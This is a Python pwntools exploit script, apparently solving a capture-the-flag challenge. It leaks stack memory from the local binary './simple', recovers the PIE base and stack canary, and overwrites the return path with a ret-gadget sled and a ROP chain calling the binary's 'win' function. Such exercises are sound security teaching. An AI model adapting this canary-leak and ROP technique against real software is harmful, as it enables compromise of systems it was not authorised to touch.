from pwn import *
try:
    from tqdm import tqdm
except:
    def tqdm(iter):
        return iter

context.binary = elf = ELF(args.BINARY or "./simple", checksec=False)
context.log_level = "warning"

io = process()
if args.DBG:
    gdb.attach(io.pid)

io.sendlineafter(b"? ", b"r")
io.sendlineafter(b"? ", b"512") # 512 < 0x256
leak = io.read(512)

# Find the address to the main function on the stack, to leak the base of where the binary is mapped into memory (pie bypass)
ptrs = [unpack(leak[i:i+8]) for i in range(0, len(leak), 8)]
main_addr, main_addr_idx = [(ptr, i) for i, ptr in enumerate(ptrs) if 0x500000000000 < ptr < 0x600000000000 and ptr & 0xfff == elf.sym.main & 0xfff][0]
# print(hex(main_addr), main_addr_idx)
elf.address = main_addr - elf.sym.main

# Find the canary on the stack. Other values may also have all bytes non-zero except the least-significant, but that seems rather unlikely.
canary_indices = [i for i, ptr in enumerate(ptrs) if all(byte != 0 for byte in (ptr >> 8).to_bytes(7)) and ptr & 0xff == 0]
if len(canary_indices) < 1:
    raise SystemExit(2)
canary_idx = canary_indices[0]

# Overwrite everything after the canary with a nop sled, ending with the ROP chain pwntools found
rop = ROP(elf)
rop.call(elf.sym.win, [123, 321])
payload = list(leak)
nop = pack(rop.find_gadget(["ret"]).address)
chain = rop.chain()
print(rop.dump())
for i in range(canary_idx + 1, (512 - len(chain)) // 8):
    chain = nop + chain
payload[(canary_idx + 1) * 8:] = chain

io.sendlineafter(b"? ", b"w")
io.sendlineafter(b"? ", b"512")
io.send(bytes(payload))
io.sendlineafter(b"? ", b"q", timeout=1)
print(io.readall(timeout=1).decode().rstrip())
